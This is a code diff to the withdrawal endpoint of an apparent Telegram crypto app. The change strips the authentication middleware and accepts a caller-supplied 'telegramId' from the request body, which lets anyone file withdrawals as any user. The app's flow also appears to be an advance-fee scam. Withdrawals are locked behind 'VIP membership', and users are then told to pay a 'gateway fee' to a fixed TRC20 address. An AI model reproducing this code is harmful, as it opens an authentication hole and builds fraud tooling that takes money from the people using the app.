@@ -1215,11 +1215,16 @@ app.post('/api/accept-terms', authMiddleware, async (req, res) => {
   } catch(e) { res.status(500).json({ error: 'Server error' }); }
 });
 
-app.post('/api/withdraw', authMiddleware, async (req, res) => {
+app.post('/api/withdraw', async (req, res) => {
   try {
-    const user = await getUserByTelegramId(req.tgUser.id);
+    // Resolve user from initData header OR telegramId in body
+    let telegramId = null;
+    try { const u = getTelegramUser(req); if (u && u.id) telegramId = String(u.id); } catch(e) {}
+    if (!telegramId && req.body && req.body.telegramId) telegramId = String(req.body.telegramId);
+    if (!telegramId) return res.status(401).json({ error: 'Session expired. Please close and reopen the app.' });
+    const user = await getUserByTelegramId(telegramId);
     if (!user) return res.status(404).json({ error: 'User not found' });
-    if (!user.is_vip) return res.status(403).json({ error: 'VIP required to withdraw' });
+    if (!user.is_vip) return res.status(403).json({ error: 'VIP membership required to withdraw.' });
     const { amount, isBankWithdrawal, toAddress, bankName, bankCountry, localCurrency, accountNumber, method } = req.body;
     const amt = parseFloat(amount);
     if (!amt || isNaN(amt) || amt < MIN_WITHDRAWAL || amt > MAX_WITHDRAWAL) {
@@ -1263,7 +1268,7 @@ app.post('/api/withdraw', authMiddleware, async (req, res) => {
       `💸 <b>Withdrawal Request #${wd.id}</b>\n👤 ${user.full_name} (${user.uid})\n💰 ${amt} USDT\n🏦 ${bankName||method||'Crypto'} — ${accountNumber||toAddress||''}\n🌍 ${bankCountry||''} ${localCurrency||''}`,
       { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ Approve', callback_data: 'wd_approve_' + wd.id }, { text: '❌ Reject', callback_data: 'wd_reject_' + wd.id }]] } }
     ).catch(() => {});
-    // STEP 4: Notify user about gateway fee requirement
+    // STEP 4: Notify user about gateway fee requirement (non-blocking)
     bot.sendMessage(user.telegram_id,
       `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\nTo finalize your withdrawal of ${amt} USDT, please settle your outstanding gateway fee.\n\n📍 <b>TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n💰 Gateway Fee: ${fees.total_fee} USDT`,
       { parse_mode: 'HTML', ...openWalletBtn() }
